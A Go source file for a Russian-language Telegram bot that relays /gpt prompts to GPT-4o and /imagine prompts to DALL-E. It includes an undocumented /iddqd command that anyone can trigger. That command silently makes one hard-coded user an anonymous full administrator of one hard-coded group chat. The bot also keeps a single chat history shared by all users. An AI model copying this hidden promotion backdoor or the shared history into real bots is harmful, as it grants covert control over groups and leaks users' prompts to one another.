package main

import (
	"BastetTetlegram/config"
	"context"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/sashabaranov/go-openai"
	"log"
	"strconv"
	"strings"
	"time"
)

const substr = "сосед"

const (
	cmdMe      = "me"
	cmdIDDQD   = "iddqd"
	cmdGPT     = "gpt"
	cmdImagine = "imagine"
	cmdStart   = "start"
	cmdHelp    = "help"
)

var (
	titles = []string{"день", "дня", "дней"}
)

func escapeMarkdownV2(text string) string {
	specialChars := []string{"_", "~", "`", ">", "#", "+", "-", "=", "|", "{", "}", ".", "!"}
	for _, char := range specialChars {
		text = strings.ReplaceAll(text, char, "\\"+char)
	}
	return text
}

func main() {
	bot, err := tgbotapi.NewBotAPI(config.Token)
	if err != nil {
		log.Panic(err)
	}
	bot.Debug = false
	log.Printf("Authorized on account %s", bot.Self.UserName)

	client := openai.NewClient(config.GPTtoken)
	req := openai.ChatCompletionRequest{
		Temperature: 0.7,
		Model:       openai.GPT4o, // Убедитесь, что константа поддерживается библиотекой
		Messages: []openai.ChatCompletionMessage{
			{
				Role:    openai.ChatMessageRoleSystem,
				Content: "Temporary message for initialization",
			},
		},
	}

	LastMention := time.Now()

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := make(chan tgbotapi.Update, 100)
	go func() {
		for update := range bot.GetUpdatesChan(u) {
			updates <- update
		}
	}()

	for update := range updates {
		if update.Message == nil {
			continue
		}
		messageText := update.Message.Text
		switch update.Message.Command() {
		case cmdMe:
			time.Sleep(1 * time.Second)
			deleteMsg := tgbotapi.DeleteMessageConfig{
				ChatID:    update.Message.Chat.ID,
				MessageID: update.Message.MessageID,
			}
			_, err := bot.Request(deleteMsg)
			if err != nil {
				log.Printf("Failed to delete message: %v", err)
			}
		case cmdStart:
			originalText := "👋 *Привет! Я — твой универсальный помощник в мире искусственного интеллекта.*\n\n" +
				"Я умею:\n" +
				"🤖 Генерировать тексты с помощью *ChatGPT*.\n" +
				"🎨 Создавать изображения с помощью *DALL-E*.\n" +
				"*Как мной пользоваться?*\n" +
				"1. Для генерации текста просто используй команду /gpt, например:\n" +
				"   - \"/gpt Напиши рассказ про космос\"\n" +
				"   - \"/gpt Придумай идею для стартапа\"\n" +
				"2. Для создания изображения используй команду `/imagine` и опиши, что ты хочешь увидеть, например:\n" +
				"   - \"/imagine Космический корабль в стиле киберпанк\"\n" +
				"*Начнем? Просто напиши мне, что тебе нужно!*\n\n" +
				"*P.S.* Если есть вопросы, используй команду `/help` 😊"
			escapedText := escapeMarkdownV2(originalText)
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, escapedText)
			msg.ParseMode = "MarkdownV2"
			_, err := bot.Send(msg)
			if err != nil {
				log.Printf("Ошибка при отправке сообщения: %v", err)
			}
		case cmdHelp:
			originalText := "Привет👋! Это свободная разработка. По вопросам обращайтесь к [разработчику бота](tg://user?id=435809098)  📬.\n" +
				" Спасибо за вашу обратную связь😊!\n\nБазовые команды:\n" +
				"- `/gpt` - Получите текстовые ответы на ваши вопросы с помощью *GPT4o*.\n" +
				"- `/imagine` - Создайте изображения на основе вашего описания.\n"
			escapedText := escapeMarkdownV2(originalText)
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, escapedText)
			msg.ParseMode = "MarkdownV2"
			_, err := bot.Send(msg)
			if err != nil {
				log.Printf("Ошибка при отправке сообщения: %v", err)
			}
		case cmdIDDQD:
			promoteConfig := tgbotapi.PromoteChatMemberConfig{
				ChatMemberConfig: tgbotapi.ChatMemberConfig{
					ChatID: -1001165249098,
					UserID: 435809098,
				},
				IsAnonymous:         true,
				CanManageChat:       true,
				CanChangeInfo:       true,
				CanPostMessages:     true,
				CanEditMessages:     true,
				CanDeleteMessages:   true,
				CanManageVoiceChats: true,
				CanInviteUsers:      true,
				CanRestrictMembers:  true,
				CanPinMessages:      true,
				CanPromoteMembers:   true,
			}
			_, err := bot.Request(promoteConfig)
			if err != nil {
				log.Printf("Failed to promote user: %v", err)
			} else {
				log.Println("User promoted successfully")
			}
		case cmdGPT:
			// Создаем контекст с таймаутом для запроса к OpenAI
			ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
			defer cancel() // Важно отменить контекст, когда функция завершится

			req.Messages = append(req.Messages, openai.ChatCompletionMessage{
				Role:    openai.ChatMessageRoleUser,
				Content: update.Message.CommandArguments(),
			})

			resp, err := client.CreateChatCompletion(ctx, req)
			if err != nil {
				apiErr, ok := err.(*openai.APIError)
				if ok && apiErr.HTTPStatusCode == 400 {
					cancel() // Отменяем текущий контекст перед созданием нового
					req = openai.ChatCompletionRequest{
						Model: openai.GPT4oMini, // Убедитесь, что константа поддерживается
						Messages: []openai.ChatCompletionMessage{
							{
								Role:    openai.ChatMessageRoleSystem,
								Content: "Clear message",
							},
						},
					}
					errorDetails := apiErr.Error()
					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Ой, что-то пошло не так. Пожалуйста, попробуйте снова."))
					log.Printf("Ошибка 400 при вызове CreateChatCompletion: %v\n", errorDetails)
					bot.Send(tgbotapi.NewMessage(435809098, errorDetails))
				} else {
					// Если ошибка не 400, обнуляем историю и отправляем сообщение
					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Я устала запоминать, обнуляюсь"))
					log.Printf("Ошибка при вызове CreateChatCompletion: %v\n", err)
					// Важно: при ошибке нужно сбросить req.Messages к начальному состоянию или очистить историю
					// В противном случае история может остаться "испорченной"
					// req.Messages = []openai.ChatCompletionMessage{
					// 	{
					// 		Role:    openai.ChatMessageRoleSystem,
					// 		Content: "Temporary message for initialization", // или другое начальное сообщение
					// 	},
					// }
				}
				continue
			}
			// Отправляем ответ от GPT
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, resp.Choices[0].Message.Content)
			bot.Send(msg)
			// Добавляем ответ GPT в историю сообщений
			req.Messages = append(req.Messages, resp.Choices[0].Message)

		case cmdImagine:
			// Создаем контекст с таймаутом для запроса к OpenAI (генерация изображения может занять время)
			ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second) // 60 секунд - разумный таймаут для DALL-E
			defer cancel()

			respUrl, err := client.CreateImage(
				ctx, // Передаем созданный контекст
				openai.ImageRequest{
					Prompt:         update.Message.CommandArguments(),
					Size:           openai.CreateImageSize512x512,
					ResponseFormat: openai.CreateImageResponseFormatURL,
					N:              1,
				},
			)
			if err != nil {
				log.Printf("Image creation error: %v\n", err)
				// Отправим сообщение об ошибке пользователю
				bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Не удалось создать изображение. Пожалуйста, попробуйте позже."))
				continue
			}
			// Отправляем URL изображения
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, respUrl.Data[0].URL)
			bot.Send(msg)
		default:
		}

		if strings.Contains(strings.ToLower(messageText), substr) {
			TimeDifference := time.Since(LastMention).Hours() / 24
			Neib := strconv.Itoa(int(TimeDifference)) + " " + declOfNum(int(TimeDifference), titles) + " без соседей"
			bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, Neib))
			log.Println(TimeDifference)
			log.Printf(LastMention.String())
			LastMention = time.Now()
			log.Printf(LastMention.String())
		}
	}
}

func declOfNum(number int, titles []string) string {
	if number < 0 {
		number *= -1
	}
	cases := []int{2, 0, 1, 1, 1, 2}
	var currentCase int
	if number%100 > 4 && number%100 < 20 {
		currentCase = 2
	} else if number%10 < 5 {
		currentCase = cases[number%10]
	} else {
		currentCase = cases[5]
	}
	return titles[currentCase]
}
